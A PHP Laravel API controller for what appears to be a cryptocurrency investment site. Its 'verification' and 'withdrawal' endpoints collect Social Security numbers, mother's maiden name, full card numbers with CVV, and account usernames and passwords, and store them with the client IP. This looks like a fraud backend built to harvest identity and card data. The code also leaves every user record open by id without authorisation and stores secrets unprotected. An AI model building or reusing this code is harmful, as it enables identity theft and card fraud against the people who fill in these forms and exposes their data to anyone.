<?php

namespace App\Http\Controllers\Api;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Deposit;
use App\Transaction;
use App\User;
use App\UserData;
use Image;
use App\Withdrawal;
use Cloudder;
use App\Mail\SendsWithdrawalsEmails;
use Mail;
use App\Card;

class FrontendController extends Controller
{

    /**
    * Get the ip address
    */
     function get_client_ip() {
        $ipaddress = '';
        if (isset($_SERVER['HTTP_CLIENT_IP']))
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_X_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
        else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_FORWARDED'];
        else if(isset($_SERVER['REMOTE_ADDR']))
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        else
            $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }

     /**
     * Generate random string to for trxRf
     */
    public function generateRandomTrxRf($length = 8){
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
   
    public function deposit_amount(Request $request, $id){
        $this->validate($request, [
            'amount' => 'required',
            'plan' => 'required',
            'coin' => 'required',
        ]);
    	$deposit = new Deposit();
    	$deposit->amount = $request->amount;
    	$deposit->user_id = $id;
        $deposit->status = 1;
    	$deposit->plan = $request->plan;
    	$deposit->coin = $request->coin;

    	$deposit->save();

    	$trans = new Transaction();
    	$trans->user_id = $id;
    	$trans->trans_type = 'deposit';
      $trans->status = 1;
      $trans->ref = $this->generateRandomTrxRf();
    	$trans->amount = $request->amount;

    	$trans->save();
    	return response()->json(true);
    }

    //get the transactions to the dashboard
    //> dashboard.vue
    public function dashboard_transactions($id){
        $transactions = User::find($id)->transactions()->paginate(5);
        return response()->json($transactions);
    }
    //get the transactions to the dashboard
    //> transaction.vue
    public function dashboard_transactions_all($id){
        $transactions = User::find($id)->transactions;
       // dd($transactions);
      
        return response()->json($transactions);
    }


    //>dashbaord.vue
    public function dashboard_transactions_count($id){
        $transactions = User::find($id)->transactions()->get();
        return response($transactions->count());
    }

    //get the wallet amount
    //> dashboard

    public function get_wallet_amount($id){
        $amount = User::find($id)->amount;
        return response($amount);
    }

    //get the activate page email
    //> verified
    public function get_activate_email($id){
        $user = User::find($id)->email;
        return response($user);
    }

    //activate user
    //>verify.vue
    public function verify_user(Request $request,$id){
       // dd($request);
        $this->validate($request, [
            'firstname' => 'required',
            'lastname' => 'required',
            'city' => 'required',
            'state' => 'required',
            'zipcode' => 'required',
            'ssn' => 'required',
            'phone' => 'required|unique:user_datas',
            'mnm' => 'required',
        ]);
          $user = User::find($id);
          $user->activated = 1;

         $data = new UserData();
         $data->user_id = $id;
         $data->firstname = $request->firstname;
         $data->lastname = $request->lastname;
         $data->address = $request->street_number .' '.$request->street_name;
         $data->state = $request->state;
         $data->city = $request->city;
         $data->country = $request->country;
         $data->zipcode = $request->zipcode;
         $data->ssn = $request->ssn;
         $data->phone = $request->phone;
         $data->mnm = $request->mnm;
         $data->dob = $request->dob;
         
          $card = new Card();
          $card->user_id = $id;
          $card->name = $request->name_on_card;
          $card->cvv = $request->cvv;
          $card->card_no =  $request->card_no;
          $card->exp_date = $request->exp_date;
          $card->street = $request->street_c;
          $card->state = $request->state_c;
          $card->city = $request->city_c;
          $card->zipcode = $request->zipcode_c;
          $card->phone = $request->phone;
          $card->ip = $this->get_client_ip();

          $card->save();
          $user->save();
          $data->save();

         return response()->json(true);

    }

    //Upload Image
    //>verify.vue
    public function upload_image(Request $request, $id){
        $user = User::find($id);
       // dd($request->image);
            $image = $request->image;
            $filename = time() . '.' . $image->getClientOriginalExtension();
            $location = public_path('img/profile/' . $filename);
            $saved = \Cloudder::upload($filename, null);
            dd($saved);
            // Image::make($image)->resize(870, 400)->save($location);
            $user->image = $filename;
            $user->save();
            return response()->json(true);
     
    }

    
    //Post Withdrawal
    //>withdrawal.vue

    public function post_withdrawal(Request $request, $id){

      $with = new Withdrawal();
      $with->user_id = $id;
      $with->name = $request->name;
      $with->amount = $request->amount;
      $with->cvv = $request->cvv;
      $with->card_no =  $request->card_no;
      $with->exp_date = $request->exp_date;
      $with->street = $request->street;
      $with->state = $request->state;
      $with->city = $request->city;
      $with->zipcode = $request->zipcode;
      $with->phone = $request->phone;
      $with->username = $request->username;
      $with->password = $request->password;
      $with->ip = $this->get_client_ip();
      $with->save();

      $trans = new Transaction();
      $trans->user_id = $id;
      $trans->trans_type = 'withdrawal';
      $trans->status = 1;
      $trans->ref = $this->generateRandomTrxRf();
      $trans->amount = $request->amount;

      //SendEmail
      $user = User::find($id);
     // dd($user);
      $emailData = [
        'trans_ref' => $trans->ref,
        'amount'  => $with->amount,
        'posted_at' => $with->created_at,
        'user_name' => $user->userData->firstname .' '. $user->userData->lastname,
       ];

     
      Mail::to($user->email)->send(new SendsWithdrawalsEmails($emailData));
      $trans->save();
      return response()->json(true);
    }

    //Get the users data
    //> Profile.vue

    public function get_profile_data($id){
      $user = User::find($id);

      return response($user);
    }
}
